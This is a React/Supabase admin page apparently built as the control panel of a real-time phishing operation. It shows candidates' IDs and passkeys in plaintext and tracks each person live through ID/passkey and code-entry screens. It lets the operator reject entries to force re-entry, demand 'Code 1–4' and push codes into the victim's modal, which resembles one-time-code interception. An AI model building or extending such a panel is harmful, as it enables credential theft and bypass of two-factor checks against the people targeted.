"use client";

import { useEffect, useState, useCallback } from "react";
import { createClient } from "@/lib/supabase/client";
import type { Booking } from "@/lib/types";
import { Send, RefreshCw, X, ShieldCheck, Clock, CheckCircle2, AlertCircle } from "lucide-react";

function formatTime(t: string) {
  const [h, m] = t.split(":").map(Number);
  const period = h >= 12 ? "PM" : "AM";
  const hour12 = h % 12 === 0 ? 12 : h % 12;
  return `${hour12}:${String(m).padStart(2, "0")} ${period}`;
}

export default function AdminBookingsPage() {
  const [supabase] = useState(() => createClient());
  const [bookings, setBookings] = useState<Booking[]>([]);
  const [loading, setLoading] = useState(true);
  const [busyId, setBusyId] = useState<string | null>(null);

  // Local state map for Pop-out code inputs for each booking row
  const [popInputs, setPopInputs] = useState<Record<string, string>>({});

  const load = useCallback(async () => {
    setLoading(true);
    const { data } = await supabase.from("bookings").select("*").order("created_at", { ascending: false });
    const rows = (data ?? []) as Booking[];
    setBookings(rows);

    // Initialize popInputs map with existing POP_CODE values if present
    const inputsMap: Record<string, string> = {};
    rows.forEach((b) => {
      if (b.additional_code?.startsWith("POP_CODE:")) {
        inputsMap[b.id] = b.additional_code.replace("POP_CODE:", "");
      }
    });
    setPopInputs((prev) => ({ ...inputsMap, ...prev }));
    setLoading(false);
  }, [supabase]);

  useEffect(() => {
    load();
  }, [load]);

  // Live updates: new submissions and candidate resubmissions appear instantly.
  useEffect(() => {
    const channel = supabase
      .channel("admin-bookings")
      .on("postgres_changes", { event: "*", schema: "public", table: "bookings" }, () => {
        load();
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [supabase, load]);

  async function setStatus(id: string, status: "confirmed" | "rejected" | "awaiting_code") {
    setBusyId(id);
    await supabase.from("bookings").update({ status }).eq("id", id);
    setBusyId(null);
  }

  // Require Candidate Input for Codes 1, 2, 3, or 4
  async function requireCode(id: string, codeNum: number) {
    setBusyId(id);
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: `CODE_${codeNum}_REQUESTED`,
      })
      .eq("id", id);
    setBusyId(null);
  }

  // Pop-out / Display Code from Admin directly to Candidate Modal
  async function sendPopCode(id: string) {
    const codeVal = (popInputs[id] || "").trim();
    if (!codeVal) return;
    setBusyId(id);
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: `POP_CODE:${codeVal}`,
      })
      .eq("id", id);
    setBusyId(null);
  }

  async function clearPopCode(id: string) {
    setBusyId(id);
    await supabase
      .from("bookings")
      .update({
        status: "pending",
        additional_code: null,
      })
      .eq("id", id);
    setPopInputs((prev) => ({ ...prev, [id]: "" }));
    setBusyId(null);
  }

  // Render comprehensive, real-time candidate phase badge
  function renderCandidatePhase(b: Booking) {
    const addCode = b.additional_code || "";

    if (b.status === "confirmed") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold bg-emerald-50 text-emerald-800 border border-emerald-200">
          <CheckCircle2 className="w-3 h-3 text-emerald-600" />
          <span>Confirmed</span>
        </span>
      );
    }

    if (b.status === "rejected") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold bg-red-50 text-red-800 border border-red-200">
          <AlertCircle className="w-3 h-3 text-red-600" />
          <span>Rejected (Re-entering ID)</span>
        </span>
      );
    }

    if (b.status === "awaiting_code") {
      if (addCode.startsWith("POP_CODE:")) {
        const codeVal = addCode.replace("POP_CODE:", "");
        return (
          <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold bg-purple-50 text-purple-900 border border-purple-200 shadow-2xs">
            <span className="w-2 h-2 rounded-full bg-purple-500 animate-pulse" />
            <span>Pop-out Code Active: {codeVal}</span>
          </span>
        );
      }

      const match = addCode.match(/CODE_(\d)_REQUESTED/i);
      const num = match ? match[1] : "1";
      return (
        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold bg-amber-50 text-amber-900 border border-amber-200">
          <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
          <span>Candidate in Code {num}</span>
        </span>
      );
    }

    // status === "pending"
    if (addCode.startsWith("[Code ")) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold bg-blue-50 text-blue-900 border border-blue-200">
          <Clock className="w-3 h-3 text-blue-600" />
          <span>{addCode.split("]")[0]}] Submitted</span>
        </span>
      );
    }

    if (b.candidate_id && b.passkey) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold bg-amber-50/80 text-amber-900 border border-amber-200">
          <Clock className="w-3 h-3 text-amber-600" />
          <span>ID &amp; Passkey (Reviewing)</span>
        </span>
      );
    }

    return (
      <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono font-semibold bg-gray-100 text-gray-700 border border-gray-200">
        <span className="w-1.5 h-1.5 rounded-full bg-gray-400" />
        <span>In ID/Passkey Modal</span>
      </span>
    );
  }

  function renderAdditionalCodeColumn(b: Booking) {
    const code = b.additional_code;
    if (!code) return "—";

    if (code.startsWith("POP_CODE:")) {
      const val = code.replace("POP_CODE:", "");
      return (
        <span className="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[11px] font-mono font-bold bg-purple-50 text-purple-800 border border-purple-200">
          ⚡ Pop: {val}
        </span>
      );
    }

    const matchReq = code.match(/CODE_(\d)_REQUESTED/i);
    if (matchReq) {
      return (
        <span className="inline-block px-2.5 py-0.5 rounded-full text-[11px] font-mono font-semibold bg-amber-50 text-amber-800 border border-amber-200">
          Awaiting Code {matchReq[1]}
        </span>
      );
    }

    return <span className="font-mono text-xs text-ink font-semibold">{code}</span>;
  }

  const pending = bookings.filter((b) => b.status === "pending" || b.status === "awaiting_code");
  const others = bookings.filter((b) => b.status === "confirmed" || b.status === "rejected");

  function Row({ b }: { b: Booking }) {
    const isPopActive = b.status === "awaiting_code" && b.additional_code?.startsWith("POP_CODE:");
    const currentPopVal = popInputs[b.id] ?? "";

    return (
      <tr className="border-b rule-hairline align-top hover:bg-paperdim/30 transition-colors">
        {/* Real-time Candidate Phase Badge */}
        <td className="py-4 pr-4 whitespace-nowrap">{renderCandidatePhase(b)}</td>

        <td className="py-4 pr-4 text-ink font-medium">{b.first_name}</td>
        <td className="py-4 pr-4 text-ink font-medium">{b.last_name}</td>
        <td className="py-4 pr-4 text-muted text-xs font-mono">{b.email}</td>
        <td className="py-4 pr-4 text-muted text-xs font-mono whitespace-nowrap">{b.phone_number || "—"}</td>
        <td className="py-4 pr-4 text-muted text-xs max-w-[200px] truncate" title={b.notes ?? ""}>
          {b.notes || "—"}
        </td>
        <td className="py-4 pr-4 text-muted font-mono text-xs whitespace-nowrap">
          {new Date(b.date + "T00:00:00").toLocaleDateString(undefined, { month: "short", day: "numeric" })}
          <span className="block text-[11px] text-ink font-semibold">{formatTime(b.start_time)}</span>
        </td>
        <td className="py-4 pr-4 font-mono text-xs text-ink font-semibold whitespace-nowrap">{b.candidate_id || "—"}</td>
        <td className="py-4 pr-4 font-mono text-xs text-ink whitespace-nowrap">{b.passkey || "—"}</td>
        <td className="py-4 pr-4 whitespace-nowrap">{renderAdditionalCodeColumn(b)}</td>
        <td className="py-4 pr-4 text-muted font-mono text-xs whitespace-nowrap">
          {new Date(b.created_at).toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" })}
        </td>

        {/* Action Controls */}
        <td className="py-4 pr-4">
          <div className="flex flex-col gap-3 font-sans text-xs min-w-[220px]">
            {/* Confirm / Reject Buttons */}
            <div className="flex items-center gap-2">
              <button
                disabled={busyId === b.id || b.status === "confirmed"}
                onClick={() => setStatus(b.id, "confirmed")}
                className="px-3 py-1 bg-emerald-50 hover:bg-emerald-100 text-emerald-800 border border-emerald-300 rounded-md font-semibold transition-colors disabled:opacity-40"
              >
                ✓ Confirm
              </button>
              <button
                disabled={busyId === b.id || b.status === "rejected"}
                onClick={() => setStatus(b.id, "rejected")}
                className="px-3 py-1 bg-red-50 hover:bg-red-100 text-red-800 border border-red-300 rounded-md font-semibold transition-colors disabled:opacity-40"
              >
                ✕ Reject
              </button>
            </div>

            {/* Section: Require Additional Codes 1, 2, 3, 4 (Candidate input) */}
            <div className="pt-2 border-t border-gray-200">
              <span className="text-[10px] text-gray-500 uppercase tracking-wider font-mono font-semibold block mb-1">
                Candidate Input Codes:
              </span>
              <div className="flex flex-wrap gap-1">
                {[1, 2, 3, 4].map((num) => {
                  const isCurrentReq = b.status === "awaiting_code" && b.additional_code === `CODE_${num}_REQUESTED`;
                  return (
                    <button
                      key={num}
                      disabled={busyId === b.id}
                      onClick={() => requireCode(b.id, num)}
                      className={`px-2 py-1 rounded font-mono text-[11px] font-semibold border transition-all disabled:opacity-40 ${
                        isCurrentReq
                          ? "bg-amber-500 text-white border-amber-600 shadow-2xs"
                          : "bg-amber-50 hover:bg-amber-100 text-amber-900 border-amber-200"
                      }`}
                      title={`Require Candidate to input Additional Code ${num}`}
                    >
                      Code {num}
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Section: Pop-out / Display Code from Admin to Candidate */}
            <div className="pt-2 border-t border-gray-200 space-y-1.5">
              <span className="text-[10px] text-purple-900 uppercase tracking-wider font-mono font-semibold flex items-center gap-1">
                <span>⚡ Pop-out Code to Candidate:</span>
              </span>

              <div className="flex items-center gap-1.5">
                <input
                  type="text"
                  placeholder="e.g. 789456"
                  value={currentPopVal}
                  onChange={(e) => setPopInputs({ ...popInputs, [b.id]: e.target.value })}
                  className="w-24 px-2 py-1 text-xs font-mono font-bold border border-purple-300 rounded bg-purple-50/50 text-purple-950 focus:bg-white focus:border-purple-500 outline-none"
                />

                <button
                  type="button"
                  disabled={busyId === b.id || !currentPopVal.trim()}
                  onClick={() => sendPopCode(b.id)}
                  className="px-2.5 py-1 bg-purple-600 hover:bg-purple-700 text-white rounded text-[11px] font-semibold font-mono transition-colors disabled:opacity-40 inline-flex items-center gap-1 shadow-2xs"
                  title="Pop out this code to candidate modal in real time"
                >
                  {isPopActive ? <RefreshCw className="w-3 h-3" /> : <Send className="w-3 h-3" />}
                  <span>{isPopActive ? "Update" : "Pop Code"}</span>
                </button>

                {isPopActive && (
                  <button
                    type="button"
                    disabled={busyId === b.id}
                    onClick={() => clearPopCode(b.id)}
                    className="p-1 hover:bg-gray-100 text-gray-500 rounded text-xs transition-colors"
                    title="Dismiss pop code"
                  >
                    <X className="w-3.5 h-3.5 text-gray-500" />
                  </button>
                )}
              </div>
            </div>
          </div>
        </td>
      </tr>
    );
  }

  const headCells = [
    "Candidate Phase",
    "First Name",
    "Last Name",
    "Email",
    "Phone",
    "Notes",
    "Date & Time",
    "Candidate ID",
    "Passkey",
    "Additional Code",
    "Created",
    "Actions",
  ];

  return (
    <div>
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h1 className="font-display text-3xl text-ink">Bookings &amp; Real-Time Verification</h1>
          <p className="mt-2 text-muted text-sm">
            Live tracking of candidate phases, verification requests (Codes 1–4), and real-time pop-out codes.
          </p>
        </div>

        <button
          onClick={() => load()}
          className="self-start sm:self-auto inline-flex items-center gap-1.5 px-3 py-1.5 border rule-hairline rounded-lg font-mono text-xs text-muted hover:text-ink hover:bg-paperdim transition-colors"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
          <span>Refresh</span>
        </button>
      </div>

      <div className="mt-8 overflow-x-auto rounded-xl border border-gray-200/80 bg-white shadow-sm">
        <table className="w-full text-left border-collapse">
          <thead>
            <tr className="border-b border-gray-200 bg-gray-50/70 font-mono text-[11px] uppercase tracking-widest2 text-gray-500">
              {headCells.map((c) => (
                <th key={c} className="py-3.5 px-4 whitespace-nowrap">{c}</th>
              ))}
            </tr>
          </thead>
          <tbody className="divide-y divide-gray-100">
            {loading && (
              <tr>
                <td colSpan={headCells.length} className="py-12 text-center text-muted font-mono text-xs">
                  Loading live bookings…
                </td>
              </tr>
            )}
            {!loading && bookings.length === 0 && (
              <tr>
                <td colSpan={headCells.length} className="py-12 text-center text-muted">
                  No bookings registered yet.
                </td>
              </tr>
            )}
            {pending.map((b) => <Row key={b.id} b={b} />)}
            {others.map((b) => <Row key={b.id} b={b} />)}
          </tbody>
        </table>
      </div>
    </div>
  );
}
